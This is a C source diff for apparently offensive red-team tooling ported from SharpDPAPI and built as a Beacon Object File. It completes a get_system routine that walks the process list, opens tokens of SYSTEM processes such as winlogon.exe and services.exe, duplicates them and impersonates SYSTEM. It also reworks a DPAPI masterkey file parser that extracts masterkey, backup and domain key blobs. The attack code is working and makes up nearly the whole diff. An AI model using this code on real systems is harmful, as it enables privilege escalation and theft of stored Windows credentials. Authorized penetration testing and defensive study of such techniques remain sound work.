@@ -3,6 +3,13 @@
  * Ported from SharpDPAPI/lib/Helpers.cs
  */
 #include "helpers.h"
+#include <tlhelp32.h>
+
+#ifdef BOF
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
+DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
+DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
+#endif
 
 /* ---- Hex string to byte array ---- */
 BYTE* hex_to_bytes(const char* hex, int* out_len) {
@@ -109,6 +116,47 @@ void str_to_lower(char* str) {
     for (; *str; str++) *str = (char)tolower((unsigned char)*str);
 }
 
+static BOOL is_local_system_sid(PSID sid) {
+    static const BYTE nt_authority[6] = SECURITY_NT_AUTHORITY;
+    SID* parsed_sid = (SID*)sid;
+
+    if (!parsed_sid) return FALSE;
+    if (parsed_sid->Revision != SID_REVISION) return FALSE;
+    if (parsed_sid->SubAuthorityCount != 1) return FALSE;
+    if (memcmp(parsed_sid->IdentifierAuthority.Value, nt_authority, sizeof(nt_authority)) != 0)
+        return FALSE;
+
+    return (parsed_sid->SubAuthority[0] == SECURITY_LOCAL_SYSTEM_RID);
+}
+
+static BOOL token_is_system(HANDLE token) {
+    DWORD size = 0;
+    BOOL result = FALSE;
+
+    if (!token) return FALSE;
+
+#ifdef BOF
+    ADVAPI32$GetTokenInformation(token, TokenUser, NULL, 0, &size);
+#else
+    GetTokenInformation(token, TokenUser, NULL, 0, &size);
+#endif
+    if (size == 0) return FALSE;
+
+    TOKEN_USER* user = (TOKEN_USER*)intAlloc(size);
+    if (!user) return FALSE;
+
+#ifdef BOF
+    if (ADVAPI32$GetTokenInformation(token, TokenUser, user, size, &size)) {
+#else
+    if (GetTokenInformation(token, TokenUser, user, size, &size)) {
+#endif
+        result = is_local_system_sid(user->User.Sid);
+    }
+
+    intFree(user);
+    return result;
+}
+
 /* ---- Check if running as high integrity ---- */
 BOOL is_high_integrity(void) {
     HANDLE hToken = NULL;
@@ -157,21 +205,130 @@ BOOL is_high_integrity(void) {
     return result;
 }
 
-/* ---- Elevate to SYSTEM via token impersonation ---- */
-BOOL get_system(void) {
-    /* Find winlogon.exe and steal its token */
-    /* This is a simplified version — in the full port we use
-       CreateToolhelp32Snapshot to find winlogon PID */
+BOOL is_system(void) {
     HANDLE hToken = NULL;
-    HANDLE hDupToken = NULL;
-    HANDLE hProcess = NULL;
     BOOL result = FALSE;
 
-    /* Try well-known PID approach: enumerate processes for winlogon */
-    /* For BOF simplicity, we look for PID passed or enumerate */
-    /* This will be fleshed out in Phase 4 when machine triage needs it */
+#ifdef BOF
+    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
+        return FALSE;
+    result = token_is_system(hToken);
+    KERNEL32$CloseHandle(hToken);
+#else
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+        return FALSE;
+    result = token_is_system(hToken);
+    CloseHandle(hToken);
+#endif
 
     return result;
+}
+
+static BOOL impersonate_system_process(const wchar_t* process_name) {
+    HANDLE hSnapshot = INVALID_HANDLE_VALUE;
+    PROCESSENTRY32W pe32;
+    BOOL result = FALSE;
+
+    if (!process_name) return FALSE;
+
+    memset(&pe32, 0, sizeof(pe32));
+    pe32.dwSize = sizeof(pe32);
+
+#ifdef BOF
+    hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
+
+    if (!KERNEL32$Process32FirstW(hSnapshot, &pe32)) {
+        KERNEL32$CloseHandle(hSnapshot);
+        return FALSE;
+    }
+
+    do {
+        HANDLE hProcess = NULL;
+        HANDLE hToken = NULL;
+        HANDLE hDupToken = NULL;
+
+        if (_wcsicmp(pe32.szExeFile, process_name) != 0) continue;
+
+        hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
+        if (!hProcess) hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
+        if (!hProcess) continue;
+
+        if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken))
+            goto cleanup_process_bof;
+        if (!token_is_system(hToken)) goto cleanup_process_bof;
+        if (!ADVAPI32$DuplicateToken(hToken, SecurityImpersonation, &hDupToken))
+            goto cleanup_process_bof;
+        if (ADVAPI32$ImpersonateLoggedOnUser(hDupToken)) {
+            result = TRUE;
+        }
+
+cleanup_process_bof:
+        if (hDupToken) KERNEL32$CloseHandle(hDupToken);
+        if (hToken) KERNEL32$CloseHandle(hToken);
+        if (hProcess) KERNEL32$CloseHandle(hProcess);
+        if (result) break;
+    } while (KERNEL32$Process32NextW(hSnapshot, &pe32));
+
+    KERNEL32$CloseHandle(hSnapshot);
+#else
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
+
+    if (!Process32FirstW(hSnapshot, &pe32)) {
+        CloseHandle(hSnapshot);
+        return FALSE;
+    }
+
+    do {
+        HANDLE hProcess = NULL;
+        HANDLE hToken = NULL;
+        HANDLE hDupToken = NULL;
+
+        if (_wcsicmp(pe32.szExeFile, process_name) != 0) continue;
+
+        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
+        if (!hProcess) hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
+        if (!hProcess) continue;
+
+        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken))
+            goto cleanup_process;
+        if (!token_is_system(hToken)) goto cleanup_process;
+        if (!DuplicateToken(hToken, SecurityImpersonation, &hDupToken))
+            goto cleanup_process;
+        if (ImpersonateLoggedOnUser(hDupToken)) {
+            result = TRUE;
+        }
+
+cleanup_process:
+        if (hDupToken) CloseHandle(hDupToken);
+        if (hToken) CloseHandle(hToken);
+        if (hProcess) CloseHandle(hProcess);
+        if (result) break;
+    } while (Process32NextW(hSnapshot, &pe32));
+
+    CloseHandle(hSnapshot);
+#endif
+
+    return result;
+}
+
+/* ---- Elevate to SYSTEM via token impersonation ---- */
+BOOL get_system(void) {
+    static const wchar_t* candidates[] = {
+        L"winlogon.exe",
+        L"services.exe",
+        L"svchost.exe",
+        L"spoolsv.exe"
+    };
+
+    if (is_system()) return TRUE;
+
+    for (int i = 0; i < (int)(sizeof(candidates) / sizeof(candidates[0])); i++) {
+        if (impersonate_system_process(candidates[i])) return TRUE;
+    }
+
+    return FALSE;
 }
 
 /* ---- Revert to original token ---- */
@@ -312,37 +469,77 @@ BOOL parse_masterkey_file(const BYTE* data, int data_len,
      * [108-115] domainkey len
      * [116+]  masterkey blob, then backup, then credhistory, then domainkey
      */
-    if (data_len < 116) return FALSE;
+    if (!data || data_len < 128 ||
+        !masterkey_bytes || !mk_len ||
+        !backup_bytes || !bk_len ||
+        !domain_key_bytes || !dk_len) {
+        return FALSE;
+    }
 
-    /* Extract GUID from bytes 12..75 (64 bytes of wide chars) */
-    wchar_t guid_str[33];
-    memcpy(guid_str, data + 12, 64);
-    guid_str[32] = L'\0';
+    *masterkey_bytes = NULL; *mk_len = 0;
+    *backup_bytes = NULL; *bk_len = 0;
+    *domain_key_bytes = NULL; *dk_len = 0;
+    if (master_key_guid) memset(master_key_guid, 0, sizeof(GUID));
 
-    /* Parse GUID — this is the file's GUID name, not the struct */
-    /* CLSIDFromString equivalent */
-    /* We'll parse from the wide string */
+    /*
+     * Layout A (older parsing):
+     * lengths at 84/92/100/108 (DWORD), payload starts at 116
+     *
+     * Layout B (SharpSCCM/SharpDPAPI):
+     * lengths at 96/104/112/120 (QWORD), payload starts at 128
+     */
+    int offset = 0;
+    int mk_size = 0, bk_size = 0, ch_size = 0, dk_size = 0;
 
-    /* Extract lengths */
-    DWORD mk_size = *(DWORD*)(data + 84);
-    DWORD bk_size = *(DWORD*)(data + 92);
-    DWORD ch_size = *(DWORD*)(data + 100);
-    DWORD dk_size = *(DWORD*)(data + 108);
+    BOOL parsed = FALSE;
 
-    int offset = 116;
+    /* Try Layout B first */
+    if (data_len >= 128) {
+        ULONGLONG mk64 = *(ULONGLONG*)(data + 96);
+        ULONGLONG bk64 = *(ULONGLONG*)(data + 104);
+        ULONGLONG ch64 = *(ULONGLONG*)(data + 112);
+        ULONGLONG dk64 = *(ULONGLONG*)(data + 120);
 
-    /* Masterkey blob */
-    if (mk_size > 0 && offset + (int)mk_size <= data_len) {
-        *masterkey_bytes = (BYTE*)intAlloc(mk_size);
-        if (*masterkey_bytes) {
-            memcpy(*masterkey_bytes, data + offset, mk_size);
-            *mk_len = mk_size;
+        if (mk64 > 0 && mk64 <= 0x7FFFFFFF &&
+            bk64 <= 0x7FFFFFFF &&
+            ch64 <= 0x7FFFFFFF &&
+            dk64 <= 0x7FFFFFFF) {
+            int off = 128;
+            int m = (int)mk64, b = (int)bk64, c = (int)ch64, d = (int)dk64;
+            if (off + m + b + c + d <= data_len) {
+                offset = off;
+                mk_size = m; bk_size = b; ch_size = c; dk_size = d;
+                parsed = TRUE;
+            }
         }
+    }
+
+    /* Fallback Layout A */
+    if (!parsed && data_len >= 116) {
+        DWORD mk32 = *(DWORD*)(data + 84);
+        DWORD bk32 = *(DWORD*)(data + 92);
+        DWORD ch32 = *(DWORD*)(data + 100);
+        DWORD dk32 = *(DWORD*)(data + 108);
+        int off = 116;
+        int m = (int)mk32, b = (int)bk32, c = (int)ch32, d = (int)dk32;
+        if (m > 0 && off + m + b + c + d <= data_len) {
+            offset = off;
+            mk_size = m; bk_size = b; ch_size = c; dk_size = d;
+            parsed = TRUE;
+        }
+    }
+
+    if (!parsed) return FALSE;
+
+    if (mk_size > 0) {
+        *masterkey_bytes = (BYTE*)intAlloc(mk_size);
+        if (!*masterkey_bytes) return FALSE;
+        memcpy(*masterkey_bytes, data + offset, mk_size);
+        *mk_len = mk_size;
     }
     offset += mk_size;
 
-    /* Backup key blob */
-    if (bk_size > 0 && offset + (int)bk_size <= data_len) {
+    if (bk_size > 0 && offset + bk_size <= data_len) {
         *backup_bytes = (BYTE*)intAlloc(bk_size);
         if (*backup_bytes) {
             memcpy(*backup_bytes, data + offset, bk_size);
@@ -351,11 +548,9 @@ BOOL parse_masterkey_file(const BYTE* data, int data_len,
     }
     offset += bk_size;
 
-    /* Skip credential history */
     offset += ch_size;
 
-    /* Domain key blob */
-    if (dk_size > 0 && offset + (int)dk_size <= data_len) {
+    if (dk_size > 0 && offset + dk_size <= data_len) {
         *domain_key_bytes = (BYTE*)intAlloc(dk_size);
         if (*domain_key_bytes) {
             memcpy(*domain_key_bytes, data + offset, dk_size);
@@ -363,7 +558,7 @@ BOOL parse_masterkey_file(const BYTE* data, int data_len,
         }
     }
 
-    return TRUE;
+    return (*masterkey_bytes != NULL && *mk_len > 0);
 }
 
 /* ---- Base64 decode using CryptStringToBinaryA ---- */
